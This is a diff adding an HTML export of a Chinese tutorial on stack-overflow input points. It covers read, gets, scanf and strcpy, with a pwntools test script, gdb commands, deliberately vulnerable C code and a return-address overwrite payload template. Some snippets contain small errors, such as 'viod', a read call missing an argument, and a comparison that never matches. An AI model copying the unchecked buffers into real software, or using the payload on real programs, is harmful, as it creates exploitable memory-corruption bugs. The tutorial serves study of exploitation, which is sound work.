@@ -1,0 +1,777 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>【知识介绍】栈溢出类“入口点”汇总+整数溢出汇总+数字的交互</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="31c64e78-ae6a-4b10-9960-63bce2f11938" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1682693296180-df4371bfb62c?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">☑️</span></div><h1 class="page-title">【知识介绍】栈溢出类“入口点”汇总+整数溢出汇总+数字的交互</h1><p class="page-description"></p></header><div class="page-body"><blockquote id="71622c90-128f-4bb0-9889-efa6fd97ef9c" class="">杯汝来前！</blockquote><h1 id="369b958a-d42d-4dbd-94ed-3acf80380a1b" class="">一、“入口点”汇总</h1><h3 id="628b014b-0e83-4095-ad19-32b0e401557b" class="">1-输入相关函数</h3><p id="975b4c6b-6940-4f6b-8b50-91b4c615193e" class=""><strong>syscall直接调用read：</strong><div class="indented"><p id="2ff35db1-24c6-4869-80ee-daf6bd817b56" class="">会一直中断监听读取某个文件(这里是stdin)，直到读到：<div class="indented"><p id="9e6bf956-052d-45cc-9423-de27fd824bff" class="">1<mark class="highlight-blue">、指定的长度</mark></p><p id="36873421-7b09-44ca-bcd9-4f284dc1981f" class="">2、<mark class="highlight-blue">到达文件末尾</mark>（原理是os维护文件描述符的数据结构也维护了文件大小，如果read到文件末尾，os会给read提示；stdin是没有文件末尾的）</p></div></p><p id="e33b75f1-ea4d-468a-ba5f-fd9384540c88" class="">注意：它在遇到”\0”的时候不会终止读取，遇到“\n”也不会终止读取</p></div></p><p id="d6e70135-747b-4f1b-8424-2bb66215cd24" class=""><strong>read函数：</strong><div class="indented"><p id="b3f726dc-7076-4052-a11a-d847c15e083c" class="">它的本质就是通过syscall直接调用read，所以同上即可~</p><blockquote id="742ee38f-be29-4e5e-854f-bea7e6a0c33b" class="">注意：<p id="8e7ec28b-3521-4a79-9860-6fbee3bed8c7" class="">1、它在遇到”\0”的时候不会终止读取，遇到“\n”会被截断(不知道为什么，可能是管道或者socket被“\n”终止中断的特性？)</p><p id="223fae86-8825-4748-868a-2e8202de3dc1" class="">2、它不会停下来等待用户输入，而是会直接读stdin缓冲区</p></blockquote></div></p><p id="5569433f-0da5-486f-be4f-2059977717ba" class=""><strong>gets函数：</strong><div class="indented"><p id="79372377-9685-4875-97a8-5287706d7d46" class="">会一直阻塞监听读取stdin，<mark class="highlight-blue">直到遇到“换行符”</mark></p><p id="2e6183e8-6a17-4b76-8f39-b73dbe6e1603" class="">其原理是循环调用read(0,buff,1)读1字节，然后判断这个字节是不是”\n”如果是就结束</p><p id="cf363dd1-f85c-4151-98c0-2a1a537d71d0" class="">注意：它在遇到”\0”的时候不会终止读取</p></div></p><p id="4a81139a-e950-4c1b-90fe-a8bc03b190e7" class=""><strong>scanf函数：</strong><div class="indented"><p id="774f7a28-cd52-4149-8ca7-febc5fa4cd9b" class="">会一直中断监听读取stdin，<mark class="highlight-blue">直到遇到“空格、制表符或换行符”</mark></p><p id="d5bb5435-42ba-4f12-8bba-9b31c1c9e503" class="">注意：它在遇到”\0”的时候不会终止读取</p></div></p><ul id="c173a9fe-6162-4ce1-8b0a-7de30dcec5a8" class="block-color-gray_background toggle"><li><details open=""><summary><strong>我们可以书写如下代码进行测试验证</strong></summary><p id="103a08e3-a7d0-446a-b689-ce945ada9a5e" class="">编程如下测试py代码：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="370c5971-06dd-4f27-87f8-5a37852136d2" class="code"><code class="language-Python">from pwn import *
+
+# 创建与被调试程序的连接
+# 请根据实际情况替换&#x27;./test&#x27;为被调试程序的路径
+p = process(&#x27;./test&#x27;)
+
+while True:
+    # 输出提示信息
+    print(&quot;1: 向被调试程序发送&#x27;aaa\\0&#x27;&quot;)
+    print(&quot;2: 向被调试程序发送&#x27;aaa\\n&#x27;&quot;)
+    print(&quot;3: 向被调试程序发送&#x27;aaa &#x27;&quot;)
+    print(&quot;4: 向被调试程序发送&#x27;aaa\\t&#x27;&quot;)
+    print(&quot;5: 退出&quot;)
+    
+    # 获取用户输入
+    choice = input(&quot;choice:&quot;)
+    
+    # 根据用户输入向被调试程序发送对应的内容
+    if choice == &#x27;1\n&#x27;:
+        p.send(b&#x27;aaa\0&#x27;)
+        print(&quot;发送成功&quot;)
+    elif choice == &#x27;2\n&#x27;:
+        p.sendline(b&#x27;aaa\n&#x27;)
+        print(&quot;发送成功&quot;)
+    elif choice == &#x27;3\n&#x27;:
+        p.send(b&#x27;aaa &#x27;)
+        print(&quot;发送成功&quot;)
+    elif choice == &#x27;4\n&#x27;:
+        p.send(b&#x27;aaa\t&#x27;)
+        print(&quot;发送成功&quot;)
+    elif choice == &#x27;5\n&#x27;:
+		    break; 
+    else:
+        print(&quot;无效的选项&quot;,choice,&quot;，请重新选择。&quot;)
+</code></pre><p id="88898f1c-fbb2-4d64-9ac5-6f6b308d458f" class="">编程如下C代码：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6e827e1c-048f-456c-b08a-fba1fa92ad4a" class="code"><code class="language-PHP">#include&lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+
+int main(){
+	char buf[64]={0};
+	gets(buf);//改成read(0,buf,64);或者scanf(buf);
+	
+	puts(&quot;finish!&quot;);
+	getchar();
+	return 0;
+}</code></pre><p id="462b9238-f1b2-46dd-8423-188fa7facb7f" class="">gcc编译：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5e445082-3d9d-497a-bbc3-e0d9b3c563c1" class="code"><code class="language-PHP">gcc -o test test.c</code></pre><p id="c06aa960-87a4-4f4e-848c-8c121c3725a2" class="">pwndbg调试：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3b7c038e-a0d7-47aa-979a-d6bc2519bf5d" class="code"><code class="language-PHP">su
+gdb -pid=202104 # 要改一下
+disas main #找到call read@plt之后的那一句的地址复制下来
+b *0x000055a60a9c21b2 # 要改一下
+# 等py程序发完要发的测试字节流
+c</code></pre></details></li></ul><h3 id="52bcacdb-4917-40b9-bf45-08ff556284d0" class="">2-strcpy函数</h3><p id="82b8dcb0-e797-41e0-bab3-8de99dc5c736" class="">【定义】</p><p id="82b7aad2-d63e-4530-be1c-a9783da8ac6e" class="">如果把strcpy的<mark class="highlight-teal">目的字符串指针指向一个位于栈上的字符串</mark>，并且<mark class="highlight-teal">对源字符串不做溢出检查&amp;不使用strncpy限制字符拷贝个数</mark>的话，如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4df0b9af-0b42-4950-a475-46d8ff9c0bea" class="code"><code class="language-Assembly">char buffer[512];
+strcpy(buffer, input);</code></pre><p id="442b6c7b-01bc-43df-afd8-bef817c879f6" class="">就可以实现“通过让源字符串的长度溢出，从而使栈上的目的字符串溢出”的效果</p><p id="38c81248-b205-49d1-a697-31675c39ce20" class="">【示例】</p><blockquote id="84ad61dd-4d55-4425-899a-6890017c0c38" class="">环境：x32，假设fuck函数的retaddr到局部变量buf之间的偏移是0x60</blockquote><p id="a7e598da-2da1-4025-a93f-ed6a93ac73e7" class="">对于以下程序：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0bcc1497-8a26-4655-8e0a-eabdf05c3259" class="code"><code class="language-Assembly">viod str1to2(char* str1){
+	char str2[512];
+  strcpy(str2, str1);
+  puts(str2);
+}
+
+int main(){
+	char str1[1024]={0};
+	read(1,str1);
+	str1to2(str1);
+	return 0;
+}</code></pre><p id="da08f560-977e-469d-b717-3df26b8105ba" class="">可以通过将input构造为：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dce477aa-fb0d-4112-b070-37987bcddbf9" class="code"><code class="language-Assembly">payload = b&quot;a&quot;*512+b&quot;a&quot;*offset+b&quot;一些栈上要填充的东西&quot;+p64(要跳转到的地址)</code></pre><p 